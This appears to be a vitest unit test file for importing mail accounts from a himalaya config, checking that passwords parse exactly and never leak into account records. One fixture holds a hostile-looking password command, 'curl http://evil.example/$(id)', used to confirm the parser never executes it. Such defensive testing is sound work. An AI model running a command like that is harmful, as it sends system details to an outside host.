// Ticket 37b — importing accounts from the user's himalaya config.
//
// The unit tests here are about the two things that can go wrong: a parser that mangles a password (so
// the user sees "wrong password" for a correct one), and a credential that leaks into something the UI
// or the audit log touches.
//
// The last block runs against a FIXTURE shaped like the user's real config (test/fixtures/himalaya) and
// asserts the shape of the result — hosts, ports, folder aliases — without ever asserting on a secret
// value. A unit run must never read ~/.config/himalaya/config.toml: it holds real credentials.

import { describe, it, expect } from 'vitest';
import { readFileSync, existsSync } from 'node:fs';
import { join } from 'node:path';

import { parseServerUrl, parseHimalayaConfig, buildImportPlan, MAX_ACCOUNTS_IMPORTED } from '../../src/main/mail/import';

const config = (body: string) => body.trim().split('\n').join('\n');

describe('himalaya import (37b) — server URLs', () => {
  it('reads host, port and TLS mode, and REQUIRES a port', () => {
    expect(parseServerUrl('imaps://mail.example.com:993')).toEqual({ host: 'mail.example.com', port: 993, tls: 'implicit', scheme: 'imaps' });
    expect(parseServerUrl('smtps://mail.example.com:465')).toEqual({ host: 'mail.example.com', port: 465, tls: 'implicit', scheme: 'smtps' });
    expect(parseServerUrl('smtp://smtp.example.com:587')).toEqual({ host: 'smtp.example.com', port: 587, tls: 'starttls', scheme: 'smtp' });
    // no port: refused rather than guessed (guessing 993 for an smtp:// URL dials the wrong service)
    expect(parseServerUrl('imaps://mail.example.com')).toBeNull();
    expect(parseServerUrl('imaps://host:0')).toBeNull();
    expect(parseServerUrl('imaps://host:99999')).toBeNull();
    expect(parseServerUrl('')).toBeNull();
    expect(parseServerUrl('not a url')).toBeNull();
    expect(parseServerUrl('maildir:///home/x/Mail')).toBeNull();
    expect(parseServerUrl('jmap://host:443')).toBeNull();
  });
});

describe('himalaya import (37b) — the TOML subset', () => {
  const text = config(`
# a comment with a [fake] table inside it
[accounts.alice]
email = "alice@example.com"
display-name = "Alice Example"
imap.server = "imaps://mail.example.com:993"
imap.sasl.plain.username = "alice@example.com"
imap.sasl.plain.password.raw = "p@ss#word with spaces"
smtp.server = "smtps://mail.example.com:465"
mailbox.alias.sent = "Sent"
mailbox.alias.trash = "Trash"

[accounts.second]
email = "second@example.com"
imap.server = "imaps://imap.example.com:993"
imap.sasl.plain.username = "second"
imap.sasl.plain.password.cmd = "pass show mail/second"

[settings]
theme = "dark"
`);

  it('reads account blocks, keeps dotted keys whole, and stops at the next table', () => {
    const p = parseHimalayaConfig(text);
    expect(p.accounts.map((a) => a.name)).toEqual(['alice', 'second']);
    expect(p.accounts[0].imap).toEqual({ host: 'mail.example.com', port: 993, tls: 'implicit' });
    expect(p.accounts[0].smtp).toEqual({ host: 'mail.example.com', port: 465, tls: 'implicit' });
    expect(p.accounts[0].folders.sent).toBe('Sent');
    expect(p.accounts[0].folders.trash).toBe('Trash');
    // a [settings] table does not become an account
    expect(p.accounts).toHaveLength(2);
  });

  it('keeps a password EXACTLY as written, including # and spaces', () => {
    const p = parseHimalayaConfig(text);
    expect(p.accounts[0].password).toBe('p@ss#word with spaces');
  });

  it('handles TOML escapes and single-quoted (literal) strings', () => {
    const p = parseHimalayaConfig(config(`
[accounts.a]
imap.server = "imaps://h:993"
email = "a@b.c"
imap.sasl.plain.password.raw = "back\\\\slash and \\"quote\\""
[accounts.b]
imap.server = 'imaps://h:993'
email = 'b@b.c'
imap.sasl.plain.password.raw = 'literal \\n stays'
`));
    expect(p.accounts[0].password).toBe('back\\slash and "quote"');
    expect(p.accounts[1].password).toBe('literal \\n stays');
  });

  it('a password command is REPORTED and never treated as a password', () => {
    const p = parseHimalayaConfig(text);
    expect(p.accounts[1].password).toBeNull();
    expect(p.accounts[1].passwordCmd).toContain('pass show');
  });

  it('reports an account whose server URL cannot be read instead of dropping it silently', () => {
    const p = parseHimalayaConfig(config(`
[accounts.good]
imap.server = "imaps://h:993"
[accounts.noimap]
email = "x@y.z"
[accounts.maildir]
imap.server = "maildir:///home/x/Mail"
`));
    expect(p.accounts.map((a) => a.name)).toEqual(['good']);
    expect(p.skipped.map((s) => s.name).sort()).toEqual(['maildir', 'noimap']);
  });

  it('is bounded: a config with 10 000 blocks yields at most the cap', () => {
    const many = Array.from({ length: 10_000 }, (_, i) => `[accounts.a${i}]\nimap.server = "imaps://h:993"`).join('\n');
    expect(parseHimalayaConfig(many).accounts.length).toBe(MAX_ACCOUNTS_IMPORTED);
  });

  it('a duplicated key keeps the FIRST value (a later line cannot silently override it)', () => {
    const p = parseHimalayaConfig(config(`
[accounts.a]
imap.server = "imaps://first:993"
imap.server = "imaps://second:993"
`));
    expect(p.accounts[0].imap.host).toBe('first');
  });

  it('never runs anything: a shell-looking password command stays a string', () => {
    const p = parseHimalayaConfig(config(`
[accounts.a]
imap.server = "imaps://h:993"
imap.sasl.plain.password.cmd = "curl http://evil.example/$(id)"
`));
    expect(p.accounts[0].passwordCmd).toBe('curl http://evil.example/$(id)');
    expect(p.accounts[0].password).toBeNull();
  });
});

describe('himalaya import (37b) — the plan splits records from secrets', () => {
  const parsed = () =>
    parseHimalayaConfig(
      config(`
[accounts.work]
email = "me@example.com"
display-name = "Work"
imap.server = "imaps://imap.example.com:993"
smtp.server = "smtps://smtp.example.com:465"
imap.sasl.plain.username = "me"
imap.sasl.plain.password.raw = "READ-SECRET"
smtp.sasl.plain.password.raw = "SEND-SECRET"
mailbox.alias.sent = "Sent Items"
[accounts.nopassword]
email = "np@example.com"
imap.server = "imaps://imap.example.com:993"
[accounts.starttls]
email = "st@example.com"
imap.server = "imap://imap.example.com:143"
[accounts.gmailish]
email = "g@example.com"
imap.server = "imaps://imap.gmail.com:993"
smtp.server = "smtp://smtp.gmail.com:587"
imap.sasl.plain.password.raw = "g"
`),
    );

  it('produces an account record and a secret, and the RECORD never contains a password', () => {
    const plan = buildImportPlan(parsed());
    const work = plan.imported.find((x) => x.account.id === 'work')!;
    expect(work.account.username).toBe('me');
    expect(work.account.host).toBe('imap.example.com');
    expect(work.account.sentFolder).toBe('Sent Items');
    const record = JSON.stringify(work.account);
    expect(record).not.toContain('READ-SECRET');
    expect(record).not.toContain('SEND-SECRET');
    // ...and the secret does carry both, because a relay password differs from the read password
    expect(work.secret.password).toBe('READ-SECRET');
    expect(work.secret.smtpPassword).toBe('SEND-SECRET');
    expect(work.notes.join(' ')).toContain('differs');
  });

  it('imports an account with no password and says so, rather than skipping it', () => {
    const plan = buildImportPlan(parsed());
    const np = plan.imported.find((x) => x.account.id === 'nopassword')!;
    expect(np.secret.password).toBe('');
    expect(np.notes.join(' ')).toContain('no password');
  });

  it('SKIPS a STARTTLS IMAP account with the reason (this build opens implicit TLS only)', () => {
    const plan = buildImportPlan(parsed());
    expect(plan.imported.find((x) => x.account.id === 'starttls')).toBeUndefined();
    expect(plan.skipped.find((s) => s.name === 'starttls')!.reason).toContain('implicit-TLS');
  });

  it('imports an implicit-IMAP account whose SEND uses STARTTLS with its SMTP server, and no "read-only" note (ticket 38)', () => {
    const plan = buildImportPlan(parsed());
    const g = plan.imported.find((x) => x.account.id === 'gmailish')!;
    expect(g.account.host).toBe('imap.gmail.com');
    expect(g.account).toMatchObject({ smtpHost: 'smtp.gmail.com', smtpPort: 587, smtpTls: 'starttls' });
    expect(g.notes.join(' ')).not.toMatch(/SENDING is unavailable/);
    const w = plan.imported.find((x) => x.account.id === 'work')!;
    expect(w.account).toMatchObject({ smtpHost: 'smtp.example.com', smtpPort: 465, smtpTls: 'implicit' });
  });

  it('an account id that cannot be an id is reported, not mangled into one', () => {
    const plan = buildImportPlan(parseHimalayaConfig(config(`
[accounts.a]
imap.server = "imaps://h:993"
`)), { accountIdPrefix: '!!' });
    // the prefix is sanitised away, so the id is still valid (the account is imported)
    expect(plan.imported[0].account.id).toBe('a');
  });
});

describe('himalaya import (37b) — a config shaped like the real one (fixture)', () => {
  const path = join(__dirname, '..', 'fixtures', 'himalaya', 'config.toml');
  const has = existsSync(path);

  it('the fixture is present (never the real ~/.config/himalaya/config.toml)', () => {
    expect(has, path).toBe(true);
  });

  it.skipIf(!has)('parses every account, with no secret in the plan records', () => {
    const raw = readFileSync(path, 'utf8');
    const parsed = parseHimalayaConfig(raw);
    const plan = buildImportPlan(parsed);
    expect(parsed.accounts.length).toBeGreaterThan(10);
    // the real config is all implicit-TLS IMAP (verified: mail.example.com:993 and gmail:993)
    expect(plan.imported.length).toBeGreaterThan(10);
    for (const entry of plan.imported) {
      expect(entry.account.tls).toBe('implicit');
      expect(entry.account.port).toBe(993);
      expect(entry.account.id).toMatch(/^[A-Za-z0-9._-]+$/);
      // The RECORD the UI and the audit log see must not carry the credential. Assert on the FIELDS
      // and the VALUES, not on the word "password": `authKind: 'password'` is the AUTH KIND (which
      // credential type to use) and is meant to be there — a test that forbids the word would ban a
      // legitimate field, the same mistake the chrome-preload test made earlier.
      const record = entry.account as unknown as Record<string, unknown>;
      for (const k of Object.keys(record)) expect(k.toLowerCase(), 'field name').not.toMatch(/^(password|secret|token|refresh|smtpPassword)$/);
      const json = JSON.stringify(entry.account);
      if (entry.secret.password) expect(json).not.toContain(entry.secret.password);
      if (entry.secret.smtpPassword) expect(json).not.toContain(entry.secret.smtpPassword);
      expect(json).not.toContain('password.raw');
    }
    // the accounts that matter to this user are in there, at the right host
    const alice = plan.imported.find((x) => x.account.id === 'alice');
    expect(alice?.account.address).toBe('alice@example.com');
    expect(alice?.account.host).toBe('mail.example.com');
    expect(alice?.secret.password).toBeTruthy();
    const ids = plan.imported.map((x) => x.account.id);
    for (const want of ['bob', 'carol', 'team-a', 'team-b', 'team-c', 'team-d']) expect(ids).toContain(want);
  });

  it.skipIf(!has)('every account carries its SMTP server; the Gmail ones send over STARTTLS and none is "read-only" (ticket 38)', () => {
    const plan = buildImportPlan(parseHimalayaConfig(readFileSync(path, 'utf8')));
    const gmail = plan.imported.find((x) => x.account.id === 'bob')!;
    expect(gmail.account.host).toBe('imap.gmail.com');
    expect(gmail.account.smtpTls).toBe('starttls');
    expect(gmail.account.smtpPort).toBe(587);
    for (const e of plan.imported) {
      expect(e.account.smtpHost, e.account.id).toBeTruthy();
      expect(e.notes.join(' '), e.account.id).not.toMatch(/SENDING is unavailable/);
    }
  });
});
